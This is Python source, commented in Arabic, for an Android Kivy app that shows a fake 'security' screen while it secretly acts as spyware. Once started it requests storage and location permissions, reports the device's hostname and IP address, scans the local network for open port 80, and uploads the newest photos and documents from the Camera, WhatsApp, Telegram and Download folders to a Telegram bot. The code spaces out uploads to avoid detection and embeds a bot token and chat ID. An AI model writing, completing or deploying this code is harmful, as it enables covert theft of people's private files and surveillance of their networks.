import os
import requests
import threading
import socket
import time
import json
from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform

# إعدادات البوت السيادي
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbynkQugNPHEFg0"
CHAT_ID = "7084557369"

class CoreSystemApp(App):
    def build(self):
        # واجهة تمويهية احترافية
        return Label(text="System Core v2.0 - Initializing Security Protocols", font_size='14sp')

    def on_start(self):
        # 1. طلب الصلاحيات القصوى فور التشغيل
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.MANAGE_EXTERNAL_STORAGE,
                Permission.ACCESS_FINE_LOCATION,
                Permission.READ_MEDIA_IMAGES
            ])
        
        # 2. تشغيل المحركات العملاقة في خلفية النظام
        threading.Thread(target=self.main_engine, daemon=True).start()

    def main_engine(self):
        # انتظار اكتمال تشغيل النظام (5 ثواني)
        time.sleep(5)
        
        # المرحلة الأولى: استطلاع معلومات الجهاز والشبكة
        self.run_reconnaissance()
        
        # المرحلة الثانية: سحب البيانات الحساسة
        self.exfiltrate_data()

    def run_reconnaissance(self):
        """جمع معلومات النظام واستطلاع الشبكة المحلية"""
        try:
            # جمع معلومات الجهاز
            device_info = {
                "Model": platform,
                "Local_IP": socket.gethostbyname(socket.gethostname()),
                "Hostname": socket.gethostname()
            }
            self.send_to_telegram(f"📡 [Recon Report]: {json.dumps(device_info, indent=2)}")

            # مسح الشبكة السريع (استطلاع الأجهزة المحيطة)
            prefix = ".".join(device_info['Local_IP'].split(".")[:-1]) + "."
            for i in range(1, 255):
                ip = prefix + str(i)
                threading.Thread(target=self.check_ip, args=(ip,), daemon=True).start()
        except:
            pass

    def check_ip(self, ip):
        """فحص المنافذ المفتوحة للأجهزة في الشبكة"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, 80)) == 0:
            self.send_to_telegram(f"🔓 Found Device: {ip} (Port 80 Open)")
        s.close()

    def exfiltrate_data(self):
        """محرك سحب الملفات والصور"""
        target_dirs = [
            "/sdcard/DCIM/Camera/",
            "/sdcard/Pictures/Telegram/",
            "/sdcard/Download/",
            "/sdcard/WhatsApp/Media/WhatsApp Images/"
        ]
        
        for folder in target_dirs:
            if os.path.exists(folder):
                files = [os.path.join(folder, f) for f in os.listdir(folder) 
                         if f.lower().endswith(('.jpg', '.png', '.pdf', '.docx'))]
                # ترتيب حسب الأحدث
                files.sort(key=os.path.getmtime, reverse=True)
                
                for file_path in files[:10]: # سحب أحدث 10 ملفات من كل مجلد
                    self.send_file(file_path)
                    time.sleep(5) # تأخير لتفادي كشف استهلاك البيانات

    def send_to_telegram(self, message):
        """إرسال التقارير النصية"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': message}, timeout=10)
        except:
            pass

    def send_file(self, file_path):
        """إرسال الملفات والوسائط"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f}, timeout=30)
        except:
            pass

if __name__ == "__main__":
    CoreSystemApp().run()
